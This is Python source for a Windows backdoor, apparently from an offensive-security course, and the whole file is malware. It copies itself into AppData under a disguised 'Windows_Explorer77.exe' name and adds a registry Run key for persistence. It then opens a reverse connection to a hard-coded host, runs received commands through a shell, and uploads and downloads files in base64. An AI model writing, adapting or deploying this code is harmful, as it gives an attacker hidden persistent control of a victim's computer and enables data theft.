import socket
import subprocess
import json
import os
import base64
import sys
from base64 import b64encode
import shutil

class Backdoor:
	def __init__(self, ip, port):
		self.become_persistant()
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def become_persistant(self):
		evil_file_loc = os.environ['Appdata'] + "\\Windows_Explorer77.exe"
		if not os.path.exists(evil_file_loc):
			shutil.copyfile(sys.executable, evil_file_loc)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_loc + '"' , shell=True)

	def reliable_send(self, data):	
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = bytearray()
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue	

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] the directory changes to" + path

	def read_file(self, path):
		with open(path , "rb") as file:
			contant = file.read()
			print(type(contant))
			contant = (base64.b64encode(contant))
			print(type(contant))
			return contant.decode()
			 
	def write_file(self, path, content):

		with open(path, "wb") as file:
			print(type(content))                     #str
			file.write(base64.b64decode(content))
			return "[+] upload sucessfull"  			 

	def execute_system_command (self, command): 
		output = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		return output.decode()

	def run(self):
		while True:
			command = self.reliable_receive()

			try:
				if (command[0] == 'exit'):
					socket.close()
					sys.exit()	 
				elif(command[0] == 'cd' and len(command) > 1):
					command_result = self.change_working_directory_to(command[1])
				elif(command[0] == 'upload'):
					command_result = self.write_file(command[1], command[2])
				elif (command[0] == 'download'):
					command_result = self.read_file(command[1])
				else:
					command_result = self.execute_system_command(command)
			except Exception:
				command_result = '[-] Error during the command execution'

			self.reliable_send(command_result)
		    
try:
	my_backdoor = Backdoor("192.168.147.129", 4443)
	my_backdoor.run()
except Exception:
	sys.exit()




   